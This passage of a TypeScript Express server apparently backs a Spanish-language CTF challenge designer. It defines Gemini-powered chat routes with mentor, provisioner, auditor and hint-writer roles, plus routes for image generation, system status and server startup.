          text: `El reto explota ${vector}. Verifica cómo se manejan los parámetros.`,
        },
        {
          id: 'def-h3',
          level: 3,
          title: 'Vector Dirigido',
          category: 'foothold',
          text: 'Construye un payload para ejecutar comandos en el sistema y leer la bandera de usuario.',
        },
      ];
    }

    // Generate the Python standalone script code
    generatedData.pythonScript = generatePythonScriptCode(generatedData);

    return res.json({
      success: true,
      scenario: generatedData,
      fallback: usedFallback,
      ...(usedFallback ? { fallbackReason } : {}),
    });
  } catch (error: any) {
    console.error('Error generating scenario:', error);
    return res.status(500).json({
      success: false,
      error: error?.message || 'Error al generar el escenario CTF',
    });
  }
});

// Route: AI CTF Mentor Multi-turn Chat
app.post('/api/chat', aiRateLimiter, async (req, res) => {
  try {
    const { role = 'mentor', model = 'gemini-3.5-flash' } = req.body || {};
    const rawMessages = req.body?.messages;

    if (rawMessages !== undefined && !Array.isArray(rawMessages)) {
      return res.status(400).json({ success: false, error: '"messages" debe ser un array.' });
    }
    if (Array.isArray(rawMessages) && rawMessages.length > MAX_CHAT_HISTORY) {
      return res.status(400).json({ success: false, error: `El historial de chat admite como máximo ${MAX_CHAT_HISTORY} mensajes.` });
    }

    const messages = (Array.isArray(rawMessages) ? rawMessages : [])
      .filter((m: any) => m && typeof m === 'object' && typeof m.content === 'string' && m.content.trim().length > 0)
      .map((m: any) => ({
        role: m.role === 'user' ? 'user' : 'model',
        content: String(m.content).slice(0, MAX_CHAT_MESSAGE),
      }));

    const allowedRoles = ['mentor', 'provisioner', 'auditor', 'hint_crafter'];
    const safeRole = typeof role === 'string' && allowedRoles.includes(role) ? role : 'mentor';

    const roleSystemInstructions: Record<string, string> = {
      mentor: `Eres un Maestro y Diseñador Senior de Escenarios CTF (Capture The Flag).
Tu misión es guiar al usuario en la creación de retos de seguridad justos, entretenidos, bien ambientados (series, ciencia ficción, fantasía, terror, cyberpunk) y con valor pedagógico.
Proporciona ideas de vectores de ataque, consejos para equilibrar la dificultad, diseño de pistas progresivas (sin spoilers directos) y buenas prácticas de evaluación de vulnerabilidades. Responde en español con tono profesional, técnico y motivador.`,
      provisioner: `Eres un Ingeniero DevSecOps experto en Contenedores y Automatización Bash para Laboratorios de Ciberseguridad.
Tu especialidad es escribir scripts de aprovisionamiento bash robustos, Dockerfiles limpios, docker-compose.yml con redes bridge segmentadas, y asegurar que el entorno vulnerable sea seguro para el host pero cumpla exactamente el reto educativo. Responde con código limpio, bien documentado y explicaciones paso a paso en español.`,
      auditor: `Eres un Auditor de Seguridad Ofensiva y Evaluador de Explotación de CTFs.
Tu objetivo es analizar la lógica del vector de ataque (SQLi, SSTI, SMB, IDOR, SUID, Deserialización, etc.), verificar que la cadena de explotación sea realista y alcanzable por los estudiantes, e indicar contramedidas defensivas y parches para que el ejercicio sea de aprendizaje integral (Red Team & Blue Team). Responde en español con rigor técnico.`,
      hint_crafter: `Eres un Creador de Pistas Tácticas para competiciones CTF.
Tu tarea es generar pistas en 3 niveles escalonados cuando el usuario te plantee un reto:
- Nivel 1: Empujón sutil (guía conceptual sin dar respuestas)
- Nivel 2: Pista táctica (herramienta, comando o área de inspección)
- Nivel 3: Revelación de vector (la técnica exacta sin dar la bandera directamente)
Responde siempre con este formato estructurado en español.`,
    };

    const systemInstruction = roleSystemInstructions[safeRole];

    const ai = getGeminiClient();

    let targetModel = await getBestAvailableModel(ai);
    if (model === 'gemini-3.1-pro-preview' || model === 'pro') {
      targetModel = await getBestAvailableModel(ai, 'pro');
    }

    const contents = messages.map((m) => ({
      role: m.role,
      parts: [{ text: m.content }],
    }));

    if (contents.length === 0) {
      contents.push({
        role: 'user',
        parts: [{ text: 'Hola, ¿cómo puedes ayudarme a diseñar un reto CTF?' }],
      });
    }

    const response = await ai.models.generateContent({
      model: targetModel,
      contents: contents,
      config: {
        systemInstruction: systemInstruction,
        temperature: 0.7,
      },
    });

    const reply = response.text || 'No se pudo generar respuesta.';

    return res.json({
      success: true,
      reply: reply,
      modelUsed: targetModel,
    });
  } catch (error: any) {
    console.error('Chat error:', error);
    return res.status(500).json({
      success: false,
      error: error?.message || 'Error en el chat de mentoría CTF',
    });
  }
});

// Route: Generate Machine Theme Art & Poster via gemini-3-pro-image-preview
const MAX_ART_PROMPT = 2000;
const VALID_ASPECT_RATIOS = ['1:1', '16:9', '9:16', '4:3', '3:4'];

app.post('/api/generate-machine-art', aiRateLimiter, async (req, res) => {
  try {
    const {
      prompt,
      imageSize = '1K',
      aspectRatio = '1:1',
    } = req.body || {};

    if (!prompt || typeof prompt !== 'string' || !prompt.trim()) {
      return res.status(400).json({ success: false, error: 'El campo "prompt" es obligatorio y debe ser texto.' });
    }
    if (prompt.length > MAX_ART_PROMPT) {
      return res.status(400).json({ success: false, error: `El "prompt" admite como máximo ${MAX_ART_PROMPT} caracteres.` });
    }
    const safePrompt = prompt.trim();

    const validSizes = ['1K', '2K', '4K'];
    const chosenSize = typeof imageSize === 'string' && validSizes.includes(imageSize) ? imageSize : '1K';
    const chosenAspectRatio = typeof aspectRatio === 'string' && VALID_ASPECT_RATIOS.includes(aspectRatio) ? aspectRatio : '1:1';

    const ai = getGeminiClient();

    let response: any = null;
    let modelUsed = 'gemini-3-pro-image-preview';

    try {
      response = await ai.models.generateContent({
        model: 'gemini-3-pro-image-preview',
        contents: {
          parts: [{ text: safePrompt }],
        },
        config: {
          imageConfig: {
            aspectRatio: chosenAspectRatio as any,
            imageSize: chosenSize as any,
          },
        },
      });
    } catch (primaryErr: any) {
      console.warn('gemini-3-pro-image-preview failed, attempting fallback to gemini-3.1-flash-image:', primaryErr?.message);
      modelUsed = 'gemini-3.1-flash-image';
      response = await ai.models.generateContent({
        model: 'gemini-3.1-flash-image',
        contents: {
          parts: [{ text: safePrompt }],
        },
        config: {
          imageConfig: {
            aspectRatio: chosenAspectRatio as any,
            imageSize: chosenSize as any,
          },
        },
      });
    }

    let imageUrl = '';
    if (response?.candidates?.[0]?.content?.parts) {
      for (const part of response.candidates[0].content.parts) {
        if (part.inlineData && part.inlineData.data) {
          const mimeType = part.inlineData.mimeType || 'image/png';
          imageUrl = `data:${mimeType};base64,${part.inlineData.data}`;
          break;
        }
      }
    }

    if (!imageUrl) {
      throw new Error('No se generó ninguna parte de imagen en la respuesta del modelo.');
    }

    return res.json({
      success: true,
      imageUrl,
      modelUsed,
      imageSize: chosenSize,
      aspectRatio: chosenAspectRatio,
    });
  } catch (error: any) {
    console.error('Image generation error:', error);
    return res.status(500).json({
      success: false,
      error: error?.message || 'Error al generar la imagen del reto CTF',
    });
  }
});

// Route: System and AI Engine Status Check
app.get('/api/system-status', async (_req, res) => {
  const apiKey = process.env.GEMINI_API_KEY;
  const hasKey = Boolean(apiKey && apiKey.trim() !== '' && apiKey !== 'MY_GEMINI_API_KEY');
  let activeModel = 'gemini-2.5-flash';
  let mode: 'cloud_ai' | 'curated_presets' = 'curated_presets';

  if (hasKey) {
    try {
      const ai = getGeminiClient();
      activeModel = await getBestAvailableModel(ai);
      mode = 'cloud_ai';
    } catch {
      activeModel = 'gemini-2.5-flash (resilient fallback)';
    }
  }

  return res.json({
    online: true,
    hasApiKey: hasKey,
    activeModel,
    mode,
    availablePresetsCount: Object.keys(DEFAULT_PRESETS).length,
  });
});

// Setup Vite or Static File Serving
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.resolve(__dirname, 'dist')));
    app.get('*', (_req, res) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'index.html'));
    });
  }

  app.listen(PORT, HOST, () => {
    console.log(`Server listening on http://${HOST}:${PORT}`);
    if (HOST === '0.0.0.0' || HOST === '::') {
      console.warn('[AVISO] El servidor escucha en todas las interfaces de red. Úsalo solo si sabes lo que haces.');
    }
  });
}

startServer().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
